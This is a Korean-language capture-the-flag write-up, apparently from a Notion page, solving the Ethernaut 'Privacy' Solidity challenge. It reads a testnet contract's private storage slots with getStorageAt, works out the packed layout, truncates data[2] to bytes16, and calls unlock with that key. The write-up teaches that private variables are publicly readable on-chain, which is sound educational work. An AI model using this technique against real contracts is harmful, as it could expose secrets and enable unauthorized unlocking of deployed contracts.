https://teberr.notion.site/Ethernaut-Privacy-4212cbdaf3a14be69021fd015ec99757

![Privacy.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e2efc694-4bdc-48a9-97e3-b1f5eb2f8ee5/Privacy.png)

> 이 컨트랙트를 만든 사람은 스토리지 영역을 보호하기 위해서 주의를 기울였습니다.

이 컨트랙트를의 unlock 함수를 통해서 locked를 false로 만들어 주세요

힌트
- 스토리지가 어떻게 작동하는지 이해하기.
- 파라미터 파싱이 어떻게 이루어지는 지 이해하기
- 타입 캐스팅이 어떻게 이루어지는지 이해하기
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

# 코드 분석 및 공격

```solidity
  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;
```

컨트랙트의 제작자가 private을 통해 데이터 값을 보호하려고 하였지만 스토리지에 저장이 되어 있기 때문에 web3.eth.getStorageAt(’컨트랙트주소,idx)를 통하여 스토리지에서 값을 불러올 수 있다.

```solidity
await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',0)
'0x0000000000000000000000000000000000000000000000000000000000000001'

await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',1)
'0x00000000000000000000000000000000000000000000000000000000634bcf90'

await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',2)
'0x00000000000000000000000000000000000000000000000000000000cf90ff0a'

await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',3)
'0x29c5a17ec11f39916cc224be6209db072a5198ab6c755ce525b8e58f70ac48c5'

await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',4)
'0xd8a1892474c793591e2eb2ee653594ec92b96e2c3490d6f1196b07ff6c9f4338'

await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',5)
'0x40af1e146f5fb9a53955628f83e3f6196aa9d684ce09a772c9e94583397dcd8a'
```

await를 통해 받아온 결과값은 총 32바이트이다.(2자리당 1바이트) 

각 결과 값을 상태변수들과 연관지어보자.

```solidity
bool public locked = true;
await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',0)
'0x0000000000000000000000000000000000000000000000000000000000000001'
```

bool 타입의 locked 상태 변수는 true로 값이 1인 것을 확인할 수 있다.

```jsx
uint256 public ID = block.timestamp;
await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',1)
'0x00000000000000000000000000000000000000000000000000000000634bcf90'

---------------------------------------------------------------------------------------
await contract.ID()
o {negative: 0, words: Array(3), length: 2, red: null}
	length : 2
	negative : 0
	red : null
	words : Array(3)
		0:55299984
		1:24
		length:3
		[[Prototype]] : Array(0)
	[[Prototype]] : Object
```

uint256 타입은 256비트(32바이트)이므로 32바이트에 할당된 공간에서 634bcf90이 들어있는 것을 확인할 수 있다. 

![55299984.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14728331-fe42-449d-bdfa-a02cb28412ed/55299984.png)

또한 ID 값은 public이므로 contract.ID를 통해 불러와본 결과 words의 첫번째 값에 55299984가 들어있는 것을 볼 수 있다. 이 값은 34bcf90으로 스토리지에서 불러온 값과 맨앞의 6만 제외하면 일치한다. 이로 인해 2번째 스토리지 값도 확인하였다.

```jsx
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);

await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',2)
'0x00000000000000000000000000000000000000000000000000000000cf90ff0a'

```

이 곳은 왜 세개의 상태 변수를 같이 가져왔는지 의아할 수 있지만 솔리디티에서 스토리지가 많을 수록 소모되는 가스 비용이 늘어나기 때문에 스토리지를 아끼기 위해서 같이 저장이 될 수 있다.

여기에 저장된 값은 cf90 ff 0a로 해석할 수 있다.

uint8의 경우 8비트로 1바이트(2칸)이고 uint 16은 16비트로 2바이트(2칸)이다. 

즉 cf90 ff 0a 는 각각 

flattening = 0a

denomination = ff

awkwardness = cf90으로 해석할 수 있다.

```jsx
bytes32[3] private data;

await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',3)
'0x29c5a17ec11f39916cc224be6209db072a5198ab6c755ce525b8e58f70ac48c5'

await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',4)
'0xd8a1892474c793591e2eb2ee653594ec92b96e2c3490d6f1196b07ff6c9f4338'

await web3.eth.getStorageAt('0xBB497D310f08F49CCbF6AE9C131a05B734EdbE25',5)
'0x40af1e146f5fb9a53955628f83e3f6196aa9d684ce09a772c9e94583397dcd8a'
```

남은 것은 byte32[3] data과 스토리지에서 불러온 세개의 값이므로 32바이트의 data 배열이 각각 대응됨을 알 수 있다.

data[0] = 0x29c5a17ec11f39916cc224be6209db072a5198ab6c755ce525b8e58f70ac48c5

data[1] = 0xd8a1892474c793591e2eb2ee653594ec92b96e2c3490d6f1196b07ff6c9f4338

data[2] = 0x40af1e146f5fb9a53955628f83e3f6196aa9d684ce09a772c9e94583397dcd8a

```solidity
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
```

문제의 unlock을 풀기위해 필요한 데이터는 이중 data[2]이다.

즉 0x40af1e146f5fb9a53955628f83e3f6196aa9d684ce09a772c9e94583397dcd8a 를 bytes16으로 강제 형변환한 값이 키값이다. 

bytes16으로 강제 형변환하면 데이터중 절반이 소실된다. 따라서

0x40af1e146f5fb9a53955628f83e3f619 만 남기고 소실이 되므로 이 값이 키값이 된다. 

즉 이 키값을 넣어서 unlock을 실행하자.

![unlock.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/28198def-77a3-42fe-907e-b78084f46a6d/unlock.png)

```jsx
await contract.unlock('0x40af1e146f5fb9a53955628f83e3f619')
6dab102ee417c6c670be5febca39e425d7e07f6c.js:1 ⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x22b2910d8ad9c9dcee0f5d595b1187c06097be1d146daf062c6b64b743170cd4
6dab102ee417c6c670be5febca39e425d7e07f6c.js:1 ⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0x22b2910d8ad9c9dcee0f5d595b1187c06097be1d146daf062c6b64b743170cd4
{tx: '0x22b2910d8ad9c9dcee0f5d595b1187c06097be1d146daf062c6b64b743170cd4', receipt: {…}, logs: Array(0)}
```

실행하고 나서 다시 locked 상태변수를 확인해주자.

![unlocked.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/508bcdf8-8f86-4ec8-b7ea-3bda442c293e/unlocked.png)

```jsx
await contract.locked()
false
```

문제의 목적인 잠금을 해제하였으므로 인스턴스를 제출하자.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2788faf4-f2f2-4411-8f65-aa2058116f46/%EC%84%B1%EA%B3%B5.png)

성공하였음을 볼 수 있다.

# 문제 후기

private 키워드는 솔리디티 언어의 구성중 하나일 뿐이지 이더리움 블록체인 내에서 진정한 private은 없다.  

Web3의 getStorageAt함수는 스토리지에 있는 모든 것을 읽을 수 있다. 물론 최적화 규칙과 기술 때문에 원하는 것을 읽는게 조금 까다로울 수는 있다. 

실제 컨트랙트에서도 스토리지에서 값을 읽는것이 이번 문제보다 많이 복잡하지는 않다. 

더 자세하게 알고 싶다면 [https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925) 를 참고하면 좋다.
